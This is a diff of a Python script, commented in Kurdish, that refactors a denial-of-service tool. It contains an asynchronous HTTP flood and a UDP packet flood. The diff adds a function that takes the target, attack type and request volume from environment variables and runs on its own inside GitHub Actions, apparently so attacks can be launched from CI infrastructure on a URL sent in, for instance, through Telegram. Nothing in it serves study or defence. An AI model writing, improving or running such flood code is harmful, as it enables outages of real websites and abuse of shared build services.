@@ -1,14 +1,12 @@
 # ناوی فایل: my_code.py
 
-def run_my_script(website_url):
-    # لێرەدا کۆدەکەی تۆ ئەو لینکە وەردەگرێت کە لە تێلیگرامەوە ناردووتە
-    print(f"دەستم کرد بە وەرگرتنی زانیاری لە: {website_url}")
-    
-    import asyncio
+import asyncio
 import aiohttp
 import random
 import socket
 from faker import Faker
+import os
+import sys
 
 fake = Faker()
 
@@ -82,12 +80,13 @@ async def website_attack(target_url, threads=300, total_requests=1000000):
                         timeout=aiohttp.ClientTimeout(total=7)
                     ) as resp:
                         print(f"[+] Packet {current} sent | Status: {resp.status}")
-            except Exception:
-                print(f"[-] Packet {current} failed or timed out")
+            except Exception as e:
+                print(f"[-] Packet {current} failed or timed out: {str(e)[:50]}")
 
     connector = aiohttp.TCPConnector(limit=0, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
-        await asyncio.gather(*[asyncio.create_task(send_packet(session)) for _ in range(threads)])
+        tasks = [asyncio.create_task(send_packet(session)) for _ in range(threads)]
+        await asyncio.gather(*tasks)
 
 
 def udp_attack(ip, port, packet_size=1024, delay=0.0001):
@@ -95,16 +94,49 @@ def udp_attack(ip, port, packet_size=1024, delay=0.0001):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sent = 0
     try:
-        while True:
+        while sent < 10000:  # سنووردار بکە بۆ 10000 پاکێج
             sock.sendto(data, (ip, port))
             sent += 1
             print(f"[+] Sent {sent} packets to {ip}:{port}")
             if delay:
                 asyncio.sleep(delay)
-    except KeyboardInterrupt:
-        print("[×] UDP Attack stopped.")
     except Exception as e:
         print(f"[!] Error: {e}")
+    finally:
+        sock.close()
+
+
+def run_my_script(website_url):
+    print(f"دەستم کرد بە وەرگرتنی زانیاری لە: {website_url}")
+    
+    # وەرگرتنی ڕێکخستنەکان لە environment variables
+    target = os.environ.get('TARGET_URL', website_url)
+    attack_type = os.environ.get('ATTACK_TYPE', 'website')
+    
+    print(f"[*] Target: {target}")
+    print(f"[*] Attack Type: {attack_type}")
+    
+    try:
+        if attack_type == 'website':
+            threads = int(os.environ.get('THREADS', '100'))
+            requests = int(os.environ.get('REQUESTS', '10000'))
+            print(f"[*] Threads: {threads}")
+            print(f"[*] Requests: {requests}")
+            asyncio.run(website_attack(target, threads, requests))
+        elif attack_type == 'udp':
+            # بۆ UDP پێویستی بە IP:PORT هەیە
+            if ':' in target:
+                ip, port = target.split(':')
+                port = int(port)
+                udp_attack(ip, port)
+            else:
+                print("[!] UDP attack needs IP:PORT format")
+    except KeyboardInterrupt:
+        print("\n[×] Stopped by user.")
+    except Exception as e:
+        print(f"[!] Error in attack: {e}")
+    
+    return "سەرکەوتوو بوو!"
 
 
 def main():
@@ -139,7 +171,12 @@ def main():
         print("[!] Invalid choice.")
 
 if __name__ == "__main__":
-    main()
-    
-    # کاتێک کارەکەی تەواو کرد، دەتوانێت نامەیەک بگەڕێنێتەوە
-    return "سەرکەوتوو بوو! داتاکان وەرگیران."
+    # ئەگەر لە GitHub Actions بێت، ئەم کۆدە ڕانابە
+    if os.environ.get('GITHUB_ACTIONS') == 'true':
+        target_url = os.environ.get('TARGET_URL', '')
+        if target_url:
+            run_my_script(target_url)
+        else:
+            print("No target URL provided")
+    else:
+        main()
